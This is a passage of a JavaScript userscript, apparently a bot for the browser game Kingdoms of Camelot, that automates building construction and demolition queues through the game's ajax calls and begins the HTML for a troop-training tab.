          params.bid = bid;
        }
        params.type = bdgid;
        new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/destruct.php" + unsafeWindow.g_ajaxsuffix, {
          method: "post",
          parameters: params,
          onSuccess: function(rslt){
            if (rslt.ok) {
              actionLog("<b>"+culang.autobuild+"</b> "+culang.actionBuild15+" " + unsafeWindow.buildingcost['bdg' + bdgid][0] + " "+culang.at+" " + cityName);
              Seed.queue_con["city" + currentcityid].push([bdgid, 0, parseInt(rslt.buildingId), unsafeWindow.unixtime(), unsafeWindow.unixtime() + time, 0, time, citpos]);
              if (params.cid == unsafeWindow.currentcityid)
                unsafeWindow.update_bdg();
              if (document.getElementById('pbHelpRequest').checked == true)
                t.bot_gethelp(params.bid, currentcityid);
              t.cancelQueueElement(0, currentcityid, time, false);
            } else {
              var errmsg = unsafeWindow.printLocalError(rslt.error_code || null, rslt.msg || null, rslt.feedback || null);
              t.requeueQueueElement(bQi);
              document.getElementById('pbbuildError').innerHTML = errmsg;
              logit(errmsg);
            }
          },
          onFailure: function(){
            document.getElementById('pbbuildError').innerHTML = ""+culang.actionBuild6+"";
          }
        })
      }
      if (mode == 'build') {
        var invalid = false;
        var chk = unsafeWindow.checkreq("bdg", bdgid, curlvl); //check if all requirements are met
        for (var c = 0; c < chk[3].length; c++) {
          if (chk[3][c] == 0) {
            invalid = true;
          }
        }
        if (invalid == false) {
          var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
          params.cid = currentcityid;
          params.bid = "";
          params.pos = citpos;
          params.lv = curlvl + 1;
          if (params.lv > 9){ //make sure that no level 10+ is built
            t.cancelQueueElement(0, currentcityid, time, false);
            actionLog("<b>"+culang.autobuild+"</b>: "+culang.actionBuild7+" "+culang.actionBuild7+" "+culang.actionBuild8+"");
            return;
          }
          if (params.lv > 1) {
            params.bid = bid;
          }
          params.type = bdgid;

          new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/construct.php" + unsafeWindow.g_ajaxsuffix, {
            method: "post",
            parameters: params,
            onSuccess: function(rslt){
              if (rslt.ok) {
                actionLog("<b>"+culang.autobuild+"</b> " + unsafeWindow.buildingcost['bdg' + bdgid][0] + " - <b>"+culang.level+"</b> " + params.lv + " - <b>"+culang.heiligtum+"</b> " + cityName);
                Seed.resources["city" + currentcityid].rec1[0] -= parseInt(unsafeWindow.buildingcost["bdg" + bdgid][1]) * mult * 3600;
                Seed.resources["city" + currentcityid].rec2[0] -= parseInt(unsafeWindow.buildingcost["bdg" + bdgid][2]) * mult * 3600;
                Seed.resources["city" + currentcityid].rec3[0] -= parseInt(unsafeWindow.buildingcost["bdg" + bdgid][3]) * mult * 3600;
                Seed.resources["city" + currentcityid].rec4[0] -= parseInt(unsafeWindow.buildingcost["bdg" + bdgid][4]) * mult * 3600;
                Seed.citystats["city" + currentcityid].gold[0] -= parseInt(unsafeWindow.buildingcost["bdg" + bdgid][5]) * mult;
                Seed.queue_con["city" + currentcityid].push([bdgid, curlvl + 1, parseInt(rslt.buildingId), unsafeWindow.unixtime(),  unsafeWindow.unixtime() + time, 0, time, citpos]);
                if (params.cid == unsafeWindow.currentcityid)
                  unsafeWindow.update_bdg();
                if (document.getElementById('pbHelpRequest').checked == true)
                  t.bot_gethelp(params.bid, currentcityid);
                t.cancelQueueElement(0, currentcityid, time, false);
              } else {
                var errmsg = unsafeWindow.printLocalError(rslt.error_code || null, rslt.msg || null, rslt.feedback || null);
                if (rslt.error_code == 103) { // building has already the target level => just  delete
                  t.cancelQueueElement(0, currentcityid, time, false);
                  actionLog("<b>"+culang.autobuild+"</b>: "+culang.actionBuild9+"");
                } else {
                  t.requeueQueueElement(bQi);
                  document.getElementById('pbbuildError').innerHTML = Cities.byID[currentcityid].name +': '+ errmsg + " "+culang.actionBuild12+"";
                }
                logit(errmsg);
              }
            },
            onFailure: function(){
              document.getElementById('pbbuildError').innerHTML = "<b>"+culang.actionBuild11+"</b>";
            }
          });
        } else {
          t.requeueQueueElement(bQi); // requeue item if check is invalid
        }
      }
    } else {
      t.cancelQueueElement(0, currentcityid, time, false);
      actionLog("<b>"+culang.autobuild+"</b>: "+culang.actionBuild10+"");
    }
  },

  requeueQueueElement: function (bQi) {
    var t = Tabs.build;
    var cityId = bQi.cityId;
    var buildingPos = parseInt(bQi.buildingPos);
    var buildingId = parseInt(bQi.buildingId);
    var buildingLevel = parseInt(bQi.buildingLevel);
    var buildingType = parseInt(bQi.buildingType);
    var buildingTime = parseInt(bQi.buildingTime);
    var buildingMult = parseInt(bQi.buildingMult);
    var buildingAttempts = parseInt(bQi.buildingAttempts);
    var buildingMode = bQi.buildingMode;

    t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts + 1, buildingMult, buildingMode); // requeue item
    t.cancelQueueElement(0, cityId, buildingTime, false); // delete Queue Item
  },
    show : function (cont){
    var t = Tabs.build;
     mainPop.div.style.width = 750 + 'px';
     if (Options.widescreen==true)mainPop.div.style.width = ""+Colors.TabWidth+"" + 'px';
  },
    bot_buildslot: function(c, a){
        var t = Tabs.build;
    var cityId = t.getCurrentCityId();
        var buildingPos   = c.id.split("_")[1];
        var buildingType  = parseInt(Seed.buildings['city' + cityId]["pos" + buildingPos][0]);
        var buildingLevel = parseInt(Seed.buildings['city' + cityId]["pos" + buildingPos][1]);
    var buildingId    = parseInt(Seed.buildings['city' + cityId]["pos" + buildingPos][3]);
    if (DEBUG_TRACE) logit("Pos: " + buildingPos + " "+culang.type+": " + buildingType + " "+culang.level+": " + buildingLevel + " ID: " + buildingId);
      var buildingAttempts = 0;
    var loaded_bQ = t["bQ_" + cityId];
    if (typeof Seed.queue_con['city' + cityId][0] != 'undefined') {
      var current_construction_pos = Seed.queue_con['city' + cityId][0][2];
    } else {
      var current_construction_pos = "";
    }
    if (loaded_bQ.length == 0 && current_construction_pos != "" ) { //check anyway if there is currently build in progess for this specific building
      if (current_construction_pos != 'NaN' && current_construction_pos == buildingId) {
        buildingLevel += 1;
      }
    } else {
      if (current_construction_pos != "" && current_construction_pos == buildingId) {
        buildingLevel += 1;
      }
      for (var i = 0; i < loaded_bQ.length; i++) { // check if there are already queue items for this building or the building is currently building
        var loadedCity = loaded_bQ[i].cityId;
        var loadedSlot = loaded_bQ[i].buildingPos;
        if (loadedSlot == buildingPos && loadedCity == cityId) {
          buildingLevel += 1;
        }
        if (loaded_bQ[i].buildingMode == 'destruct' && loadedSlot == buildingPos && loadedCity == cityId) { // check if destrcution is already in queue
          t.modalmessage(''+culang.actionBuild16+'');
          return;
        }
      }
    }
    if (t.currentBuildMode == "build") {
      if (buildingLevel >= 9) {
        t.modalmessage(''+culang.actionBuild17+'');
        return;
      }
      var buildingMode = "build";
      var result = t.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
      var buildingMult = result[0];
      var buildingTime = result[1];
      var queueId = loaded_bQ.length;
      t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode);
      t._addTab(queueId, cityId, buildingType, buildingTime, buildingLevel, buildingAttempts, buildingMode);
    }
    if (t.currentBuildMode == "max") {
      var buildingMode = "build";
      for (var bL = buildingLevel; bL <9; bL++) {
        var queueId = loaded_bQ.length;
        var result = t.calculateQueueValues(cityId, bL, buildingType, buildingMode);
        var buildingMult = result[0];
        var buildingTime = result[1];
        queueId = queueId ;
        t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, bL, buildingAttempts, buildingMult, buildingMode);
        t._addTab(queueId, cityId, buildingType, buildingTime, bL, buildingAttempts, buildingMode);
      }
    }
    if (t.currentBuildMode == "destruct") {
      var buildingMode = "destruct";
      var result = t.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
      var buildingMult = result[0];
      var buildingTime = result[1];
      var queueId = loaded_bQ.length;
      t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode);
      t._addTab(queueId, cityId, buildingType, buildingTime, buildingLevel, buildingAttempts, buildingMode);
    }
	   },
	calculateQueueValues: function (cityId, buildingLevel, buildingType, buildingMode) {
	    var t = Tabs.build;
		var now = unixTime();
		if (buildingMode == 'build') {
			var buildingMult = Math.pow(2, buildingLevel);
        } 
		if (buildingMode == 'destruct') {
			var buildingMult = Math.pow(2, buildingLevel - 2);
		}
				
		var knights = Seed.knights["city" + cityId];
		if (knights) {
			var polKniId = parseInt(Seed.leaders['city' + cityId].politicsKnightId);
			if (polKniId) {
				var polValue = parseInt(Seed.knights['city' + cityId]['knt' + polKniId].politics);
				var polBoost = parseInt(Seed.knights['city' + cityId]['knt' + polKniId].politicsBoostExpireUnixtime);
				if ((polBoost - now) > 0) {
					polValue = parseInt(polValue * 1.25);
				}
			} else {
				polValue = 0;
			}
		} else {
			polValue = 0;
		}
        
        var buildingTime = unsafeWindow.buildingcost["bdg" + buildingType][7] * buildingMult;
        if (parseInt(buildingType) < 6 && parseInt(buildingType) > 0 && buildingMult == 1) {
            buildingTime = 15;
        }
		if (buildingMode == 'build') {
			buildingTime = parseInt(buildingTime / (1 + 0.005 * polValue + 0.1 * parseInt(Seed.tech.tch16)));
        } 
		if (buildingMode == 'destruct') {
			buildingTime = buildingTime / (1 + 0.005 * polValue + 0.1 * parseInt(Seed.tech.tch16));
			if (buildingTime % 1 > 0) {
				buildingTime = parseInt(buildingTime);
			}
		}
		
		var result = new Array(buildingMult, buildingTime);
		return result;
	},
	bot_buildguardian: function(c, a){
        var t = Tabs.build;
		var cityId = t.getCurrentCityId();
        var buildingType  = 50;
		for(i=0; i < Cities.numCities; i++){
			if(Seed.guardian[i].cityId == cityId){
				var buildingLevel = Seed.guardian[i].level;
				break;
			}
		}
		var buildingId    = parseInt(Seed.buildings['city' + cityId]["pos" + buildingPos][3]);
		if (DEBUG_TRACE) logit("Pos: " + buildingPos + " "+culang.type+": " + buildingType + " "+culang.level+": " + buildingLevel + " Id: " + buildingId);
  		var buildingAttempts = 0;
		var loaded_bQ = t["bQ_" + cityId];
		if (typeof Seed.queue_con['city' + cityId][0] != 'undefined') {
			var current_construction_pos = Seed.queue_con['city' + cityId][0][2];
		} else {
			var current_construction_pos = "";
		}
		if (loaded_bQ.length == 0 && current_construction_pos != "" ) { //check anyway if there is currently build in progess for this specific building
			if (current_construction_pos != 'NaN' && current_construction_pos == buildingId) {
				buildingLevel += 1;
			}
		} else {
			if (current_construction_pos != "" && current_construction_pos == buildingId) {
				buildingLevel += 1;
			}
			for (var i = 0; i < loaded_bQ.length; i++) { // check if there are already queue items for this building or the building is currently building
				var loadedCity = loaded_bQ[i].cityId;
				var loadedSlot = loaded_bQ[i].buildingPos;
				if (loadedSlot == buildingPos && loadedCity == cityId) {
					buildingLevel += 1;
				}
				if (loaded_bQ[i].buildingMode == 'destruct' && loadedSlot == buildingPos && loadedCity == cityId) { // check if destrcution is already in queue
					t.modalmessage(''+culang.actionBuild16+'');
					return;
				}
			}
		}
        if (t.currentBuildMode == "build") {
		    if (buildingLevel >= 9) {
                t.modalmessage(''+culang.actionBuild17+'');
                return;
            }
            var buildingMode = "build";
			var result = t.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
			var buildingMult = result[0];
			var buildingTime = result[1];
			var queueId = loaded_bQ.length;
			t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode);
			t._addTab(queueId, cityId, buildingType, buildingTime, buildingLevel, buildingAttempts, buildingMode);
        }
        if (t.currentBuildMode == "max") {
            var buildingMode = "build";
			for (var bL = buildingLevel; bL <9; bL++) {
				var queueId = loaded_bQ.length;
				var result = t.calculateQueueValues(cityId, bL, buildingType, buildingMode);
				var buildingMult = result[0];
				var buildingTime = result[1];
				queueId = queueId ;
				t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, bL, buildingAttempts, buildingMult, buildingMode);
				t._addTab(queueId, cityId, buildingType, buildingTime, bL, buildingAttempts, buildingMode);
			}
        }
        if (t.currentBuildMode == "destruct") {
            var buildingMode = "destruct";
			var result = t.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
			var buildingMult = result[0];
			var buildingTime = result[1];
			var queueId = loaded_bQ.length;
			t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode);
			t._addTab(queueId, cityId, buildingType, buildingTime, buildingLevel, buildingAttempts, buildingMode);
        }
  },

  calculateQueueValues: function (cityId, buildingLevel, buildingType, buildingMode) {
    var t = Tabs.build;
    var now = unixTime();
    if (buildingMode == 'build') {
      var buildingMult = Math.pow(2, buildingLevel);
    }
    if (buildingMode == 'destruct') {
      var buildingMult = Math.pow(2, buildingLevel - 2);
    }

    var knights = Seed.knights["city" + cityId];
    if (knights) {
      var polKniId = parseInt(Seed.leaders['city' + cityId].politicsKnightId);
      if (polKniId) {
        var polValue = parseInt(Seed.knights['city' + cityId]['knt' + polKniId].politics);
        var polBoost = parseInt(Seed.knights['city' + cityId]['knt' + polKniId].politicsBoostExpireUnixtime);
        if ((polBoost - now) > 0) {
          polValue = parseInt(polValue * 1.25);
        }
      } else {
        polValue = 0;
      }
    } else {
      polValue = 0;
    }

    var buildingTime = unsafeWindow.buildingcost["bdg" + buildingType][7] * buildingMult;
    if (parseInt(buildingType) < 6 && parseInt(buildingType) > 0 && buildingMult == 1) {
      buildingTime = 15;
    }
    if (buildingMode == 'build') {
      buildingTime = parseInt(buildingTime / (1 + 0.005 * polValue + 0.1 * parseInt(Seed.tech.tch16)));
    }
    if (buildingMode == 'destruct') {
      buildingTime = buildingTime / (1 + 0.005 * polValue + 0.1 * parseInt(Seed.tech.tch16));
      if (buildingTime % 1 > 0) {
        buildingTime = parseInt(buildingTime);
      }
    }

    var result = new Array(buildingMult, buildingTime);
    return result;
  },

  bot_gethelp: function (f, currentcityid) {
		var t = Tabs.build;
		var city = t.getCityNameById(currentcityid);
		for (i=0;i<Seed.cities.length;i++) {
			if (Seed.cities[i][1]==city) var cityNum=i;
		}
		cityNum++;
		unsafeWindow.citysel_click(document.getElementById('citysel_'+ (cityNum)));
	  var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
	  params.bid = f;
	  params.ctrl = 'AskForHelp';
	  params.action = 'getHelpData';
	  new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
		  method: "post",
		  parameters: params,
		  onSuccess: function (rslt) {
			unsafeWindow.handleHelpCallback (rslt.data);
		  },
		  onFailure: function (rslt) {
			t.bot_gethelp (f, currentcityid);
			return;
		  },
		  });

	  var a = Seed.queue_con["city" + currentcityid];
	  var e = 0;
	  var d = 0;
    for (var c = 0; c < a.length; c++) {
      if (parseInt(a[c][2]) == parseInt(f)) {
        e = parseInt(a[c][0]);
        d = parseInt(a[c][1]);
        break
      }
    }
    var b = new Array();
    b.push(["REPLACE_LeVeLbUiLdInG", d]);
    b.push(["REPLACE_BuIlDiNgNaMe", unsafeWindow.buildingcost["bdg" + e][0]]);
    b.push(["REPLACE_LeVeLiD", d]);
    b.push(["REPLACE_AsSeTiD", f]);
    var g = function(h, i) {
      unsafeWindow.continuation_95(h, i);
      if (!h) {
        var j = d > 1 ? unsafeWindow.cm.SpeedUpType.upgrade: unsafeWindow.cm.SpeedUpType.build;
        unsafeWindow.cm.ClientSideCookieManager.setCookie(j, false)
      }
    };
    unsafeWindow.common_postToProfile("95", unsafeWindow.Object.cloneFeed(unsafeWindow.template_data_95), unsafeWindow.Object.cloneFeed(unsafeWindow.actionlink_data_95), g, b)
  },

  addQueueItem: function (cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode) {
    var t = Tabs.build;
    var lbQ = t["bQ_" + cityId];
    lbQ.push({
      cityId:            cityId,
      buildingPos:      buildingPos,
      buildingType:      buildingType,
      buildingId:        buildingId,
      buildingTime:      buildingTime,
      buildingLevel:    buildingLevel,
      buildingAttempts:  buildingAttempts,
      buildingMult:      buildingMult,
      buildingMode:      buildingMode
    });
    t.modifyTotalTime(cityId, 'increase', buildingTime); //adjust total Time
  },

  modalmessage: function(message){
    var t = Tabs.build;
    var timeout = 10000;
    var content = ""+culang.modalmsgclose+"<br><br>"
    content += message;
    unsafeWindow.Modal.showAlert(content);
    window.setTimeout('unsafeWindow.Modal.hideModal();', timeout);
  },

  modifyTotalTime: function (cityId, type, buildingTime) {
    var t = Tabs.build;
    var element = document.getElementById('pbbuildcount_' + cityId);
    var currentCount = parseInt(element.innerHTML);
    if (type == "increase") {
      t['totalTime_' + cityId] = t['totalTime_' + cityId] + buildingTime;
      var currentCount = currentCount + 1;
    }
    if (type == "decrease") {
      t['totalTime_' + cityId] = t['totalTime_' + cityId] - buildingTime;
      var currentCount = currentCount - 1;
    }
    element.innerHTML = currentCount;
    document.getElementById('pbbuildtotal_' + cityId).innerHTML = timestr(t['totalTime_' + cityId]);
  },

 hide : function (){
    var t = Tabs.build;
     mainPop.div.style.width = 750 + 'px';
     if (Options.widescreen==true)mainPop.div.style.width = ""+Colors.TabWidth+"" + 'px';
  },

  onUnload: function(){
    var t = Tabs.build;
    for (var i = 0; i < Cities.cities.length; i++) {
      //t["bQ_" + Cities.cities[i].id] = []; //clean up if needed
      if (!ResetAll) GM_setValue('bQ_' + getServerId() + '_' + Cities.cities[i].id, JSON2.stringify((t["bQ_" + Cities.cities[i].id])));
    }
    t.saveBuildStates();
  },

  _addTab: function(queueId, cityId, buildingType, buildingTime, buildingLevel, buildingAttempts, buildingMode){
    var t = Tabs.build;
    var row = document.getElementById('pbCityQueueContent').insertRow(0);
    row.vAlign = 'top';
    row.insertCell(0).innerHTML = queueId;
    if (buildingMode == "destruct") {
      row.insertCell(1).innerHTML = '<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/bonus_att.png">';
    } else {
      row.insertCell(1).innerHTML = '<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/bonus_prod.png">';
    }
    row.insertCell(2).innerHTML = unsafeWindow.buildingcost['bdg' + buildingType][0];
    row.insertCell(3).innerHTML = timestr(buildingTime);
    if (buildingMode == "destruct") {
      row.insertCell(4).innerHTML = 0;
    } else {
      row.insertCell(4).innerHTML = buildingLevel + 1; // => target Level
    }
    row.insertCell(5).innerHTML = buildingAttempts;
    row.insertCell(6).innerHTML = '<a class="button20" id="queuecancel_' + queueId + '"><span>'+culang.deleteb+'</span></a>';
    document.getElementById('queuecancel_' + queueId).addEventListener('click', function(){
      t.cancelQueueElement(queueId, cityId, buildingTime, true);
    }, false);
  },

  cancelQueueElement: function(queueId, cityId, buildingTime, showQueue){
    var t = Tabs.build;
    var queueId = parseInt(queueId);
    t["bQ_" + cityId].splice(queueId, 1);
    t.modifyTotalTime(cityId, 'decrease', buildingTime); //adjust total Time

    if (showQueue == true) {
      t.showBuildQueue(cityId, false);
    }
  },

  showBuildQueue: function(cityId, focus){
    var t = Tabs.build;
    clearTimeout (t.timer);
    var popBuildQueue = null;
    var cityName = t.getCityNameById(cityId);
    if (t.popBuildQueue == null) {
      t.popBuildQueue = new CPopup('pbbuild_' + cityId, 0, 0, 746, 100, true, function() {clearTimeout (t.timer);});
    }
    var m = '<DIV style="max-height:760px; height:620px; overflow-y:auto"><TABLE align=center cellpadding=0 cellspacing=0 width=100% class="pdxTabPad" id="pbCityQueueContent">';
    t.popBuildQueue.getMainDiv().innerHTML = '</table></div>' + m;
    t.popBuildQueue.getTopDiv().innerHTML = '<div class=showBadged><center><INPUT id=pbOptimizeByTime type=submit value="'+culang.pbOptimizeByTime+'"></center></div>';
    t.paintBuildQueue(cityId);
    if (focus)
      t.popBuildQueue.show(true);
    document.getElementById('pbOptimizeByTime').addEventListener('click', function(){t.clearBuildQueue();t.paintBuildQueue(cityId, true);}, false);
    t.timer = setTimeout (function() {t.showBuildQueue(cityId, false)}, 45000);
  },

  paintBuildQueue: function(cityId, optimize){
    var t = Tabs.build;
    var lbQ = t["bQ_" + cityId];
    if (optimize == true) {
      lbQ.sort(function(a,b){return a.buildingTime - b.buildingTime});
    }
    t["bQ_" + cityId] = lbQ;
    for (var i = 0; i < lbQ.length; i++) {
      var queueId = i;
      t._addTab(queueId, lbQ[i].cityId, lbQ[i].buildingType, lbQ[i].buildingTime, lbQ[i].buildingLevel, lbQ[i].buildingAttempts, lbQ[i].buildingMode);
    }
  },

  clearBuildQueue: function() {
    var t = Tabs.build;
    var table = document.getElementById('pbCityQueueContent');
    var rows = table.rows;
    while(rows.length)
      table.deleteRow(rows.length-1);
  },

  getCurrentCityId: function(){ // TODO maybe move as global function to the core application
    if (!unsafeWindow.currentcityid)
      return null;
    return unsafeWindow.currentcityid;
  },

  saveBuildStates: function(){
    var t = Tabs.build;
    var serverID = getServerId();
    GM_setValue('buildStates_' + serverID, JSON2.stringify(t.buildStates));
  },

  readBuildStates: function(){
    var t = Tabs.build;
    var serverID = getServerId();
    s = GM_getValue('buildStates_' + serverID);
    if (s != null) {
      states = JSON2.parse(s);
      for (k in states)
        t.buildStates[k] = states[k];
    }
  },
  toggleStateRunning: function(obj){
    var t = Tabs.build;
    if (t.buildStates.running == true) {
      t.buildStates.running = false;
      t.saveBuildStates();
      obj.value = ""+culang.autobuild+" = "+culang.buttonoff;
    } else {
      t.buildStates.running = true;
      t.saveBuildStates();
      obj.value = ""+culang.autobuild+" = "+culang.buttonon;
    }
  },
  toggleStateMode: function(obj){
    var t = Tabs.build;
    if (obj.value == ''+culang.buildmode+' = '+culang.buttonoff+'') {
      unsafeWindow.buildslot = t.bot_buildslot; // overwrite original koc function
	  var guardian = document.getElementById('citymap').getElementsByClassName('bldg_guardian_0');
	  if(guardian.length >0)
	  guardian[0].addEventListener('click', t.bot_buildguardian, false);
      obj.value = ""+culang.buildmode+" = "+culang.buttonon;
    } else {
      unsafeWindow.buildslot = t.koc_buildslot; // restore original koc function
	  var guardian = document.getElementById('citymap').getElementsByClassName('bldg_guardian_0');
	  if(guardian.length >0)
	  guardian[0].removeEventListener('click', t.bot_buildguardian, false);
      obj.value = ""+culang.buildmode+" = "+culang.buttonoff;
    }
  },

  getCityNameById: function (cityId) {
    return Cities.byID[cityId].name;
  },
}
/***********************************************************************************/
/************ KOC POWER - TABS TRAIN **********************************************/
/*********************************************************************************/
Tabs.Train = {
  tabLabel : culang.train,
  tabOrder : StyleOptions.toAusbildung,
  cont : null,
  timer : null,
  stats : {},
  selectedCity : {},
  trainTimer : null,
  running : false,
  gamble : {"1":{"min":"5","max":"15","cost":"2"},"2":{"min":"10","max":"25","cost":"4"}},
  nextWallTrain:				null,
  defenseOptions:	"<option value='53'>"+culang.crossbows+"</option><option value='55'>"+culang.trebuchet+"</option><option value='60'>"+culang.shrtrap+"</option><option value='61'>"+culang.caltr+"</option><option value='62'>"+culang.spiked+"</option>",
  prevCityNo:			0,

  init : function (div){
    var t = Tabs.Train;
    t.cont = div;
    unsafeWindow.cancelTrain = t.butcancelTrain;
    unsafeWindow.cancelFort = t.butcancelFort;
	
	t.cont.style.overflowY = 'auto';
	t.cont.style.height = '860px';
	t.cont.style.width = '750px';
	if (Seed.items.i36){tutel1=Seed.items.i36}else{tutel1=0};
	if (Seed.items.i37){tutel2=Seed.items.i37}else{tutel2=0};
	if (Seed.items.i38){tutel3=Seed.items.i38}else{tutel3=0};
	if (Seed.items.i26){siege1=Seed.items.i26}else{siege1=0};
    s = "<DIV id=trainTopSelect >\
      <DIV class=pdxStat id=trainheader>"+culang.Htrain+"</div><DIV style='height:5px'></div><DIV class=pdxEntry>\
      <DIV style='text-align:center; margin-bottom:5px;'><b>"+culang.holyplace+"</b>: &nbsp; <span id=ptspeedcity></span></div>\
      <TABLE class=pdxTab width=500px;><TR valign=top><TD width=50%>\
      <TABLE align=center><TR><TD align=right>"+culang.troops+": </td><TD colspan=2>\
      <SELECT id=ptttType>        <option value='1'>"+culang.supplytroop+"</option>        <option value='2'>"+culang.militiaman+"</option>        <option value='3'>"+culang.scout+"</option>        <option value='4'>"+culang.pikeman+"</option>        <option value='5'>"+culang.swordsman+"</option>        <option value='6'>"+culang.archer+"</option>        <option value='7'>"+culang.cavalry+"</option>        <option value='8'>"+culang.heavycavalry+"</option>        <option value='9'>"+culang.supplywagon+"</option>        <option value='10'>"+culang.ballista+"</option>        <option value='11'>"+culang.batteringram+"</option>        <option value='12'>"+culang.catapult+"</option>\
      </select> &nbsp; ("+culang.max+". <span id=ptttSpMax></span>)</td></tr>\
      <TR><TD align=right># "+culang.eachslot+": </td><TD><INPUT id='ptttInpPS' size=5 type='text' value='0'\></td>\
        <TD><INPUT id='ptttButMaxPS' type=submit value='max'\> &nbsp; ("+culang.max+" <span id=ptttSpMaxPS>0</span>)</td></tr>\
      <TR><TD align=right>"+culang.slots+": </td><TD><INPUT id='ptttInpSlots' size=2 type='text' value='1'\></td>\
        <TD width=75%><INPUT id='ptttButMaxSlots' type=submit value='max'\> &nbsp; ("+culang.max+" <span id=ptttSpMaxSlots>1</span>)</td></tr>\
	    <TR><TD align=right>"+culang.need+":</td><td><span id=ptttLimiter class=boldRed></span></TD><TD></TD></TR>\
		<TR><TD align=right valign=top>"+culang.worker+": </td><TD colspan=2><INPUT type=CHECKBOX id=chkPop"+ (Options.maxIdlePop?' CHECKED ':'') +"> \
        <SPAN style='white-space:normal;'>"+culang.useworkernote+" <BR>"+culang.useworkernote2+"</span>\
		<br><INPUT type=CHECKBOX id=chkTut> \
		<SELECT id=tutelage>		<option value='0'><CENTER>--- "+uW.g_js_strings.commonstr.items+" "+uW.g_js_strings.commonstr.speedup+" ---</center></option>		<option value='36'>"+ unsafeWindow.itemlist.i36.name+" ("+tutel1+")</option>        <option value='37'>"+ unsafeWindow.itemlist.i37.name+" ("+tutel2+")</option>        <option value='38'>"+ unsafeWindow.itemlist.i38.name+" ("+tutel3+")</option>		</select>\
		<br><br><SELECT id=pttrgamble>			<option value='0'><CENTER>--- "+uW.g_js_strings.commonstr.resources+" "+uW.g_js_strings.commonstr.speedup+" ---</center></option>			<option value=1>"+culang.use+" "+ t.gamble[1].cost+"x "+culang.res+" ("+ t.gamble[1].min+" - "+t.gamble[1].max+"%)</option>			<option value=2>"+culang.use+" "+ t.gamble[2].cost+"x "+culang.res+" ("+ t.gamble[2].min+" - "+t.gamble[2].max+"%)</option>	</select>\
		</td></tr>\
      <TR><TD colspan=3 align=center><DIV style='height:10px'></div><INPUT id='ptttButDo' type=submit value='"+culang.traintroopsnow+"'\></td></tr>\
	  <TR><TD colspan=3 align=center><span style=\"font-size:10px; color:#555; line-height:10px; \"><font color=#600000><B><u>"+culang.resTrainMode+"</u></b></font><BR> "+culang.OresTrainNote +"</td></tr>\
      </table></td><TD width=20></td><TD style='border-left:solid 2px;' width=50% align=center>\
      <TABLE align=center><TR><TD align=right>"+culang.TTwallbuild+": </td><TD colspan=2>\
      <SELECT id=pttdType>        <option value='53'>"+culang.crossbows+"</option>        <option value='55'>"+culang.trebuchet+"</option>        <option value='60'>"+culang.shrtrap+"</option>        <option value='61'>"+culang.caltr+"</option>        <option value='62'>"+culang.spiked+"</option>      </select> &nbsp; (<span id=pttdSpMax></span>)</td></tr>\
      <TR><TD align=right># "+culang.eachslot+": </td><TD><INPUT id='pttdInpPS' size=5 type='text' value='0'\></td>\
        <TD><INPUT id='pttdButMaxPS' type=submit value='max'\> &nbsp; ("+culang.max+". <span id=pttdSpMaxPS>0</span>)</td></tr>\
      <TR><TD align=right>"+culang.slots+": </td><TD><INPUT id='pttdInpSlots' size=2 type='text' value='1'\></td>\
        <TD width=75%><INPUT id='pttdButMaxSlots' type=submit value='max'\> &nbsp; ("+culang.max+". <span id=pttdSpMaxSlots>1</span>)</td></tr>\
		<TR><td align=right>"+culang.need+":</td><TD><span id=pttdLimiter class=boldRed></span></td><TD><span id=pttdEstimate></span></TD></tr>\
		<TR align=center><TD colspan=3><SPAN id=pttdSpace></span></td></tr>\
	 <TR><TD align=center colspan=3><INPUT type=CHECKBOX id=chkDoTraps"+ (WallTrainOptions.doTraps[1]?' CHECKED ':'') +">"+culang.autobuild+" - "+culang.max+". "+culang.trap+" ("+culang.min+"=1 "+culang.max+"=5)</TD></TR>\
   	 <TR><TD align=center colspan=3><INPUT type=CHECKBOX id=chkDoCaltrops"+ (WallTrainOptions.doCalrops[1]?' CHECKED ':'') +">"+culang.autobuild+" - "+culang.max+". "+culang.caltr+" ("+culang.min+"=1 "+culang.max+"=5)</TD></TR>\
	 <TR><TD align=center colspan=3><INPUT type=CHECKBOX id=chkDoSpikes"+ (WallTrainOptions.doSpikes[1]?' CHECKED ':'') +">"+culang.autobuild+" - "+culang.max+". "+culang.spiked+" ("+culang.min+"=1 "+culang.max+"=5)</TD></TR>\
   	 <TR><TD align=center colspan=3><INPUT type=CHECKBOX id=chkDoXbows"+ (WallTrainOptions.doXbows[1]?' CHECKED ':'') +">"+culang.autobuild+" - "+culang.max+". "+culang.crossbows+" ("+culang.min+"=1 "+culang.max+"=5)</TD></TR>\
	 <TR><TD colspan=3 align=center><DIV style='height:10px'>      <SELECT id=siege>      <option value='0'><CENTER>--- "+unsafeWindow.g_js_strings.commonstr.speedup+" ---</center></option>      <option value='26'>"+ unsafeWindow.itemlist.i26.name+" ("+siege1+")</option>      </select></div>\
      <TR><TD colspan=3 align=center><DIV style='height:10px'></div><INPUT id='pttdButDo' type=submit value='"+culang.builddef+"'\></td></tr></table>\
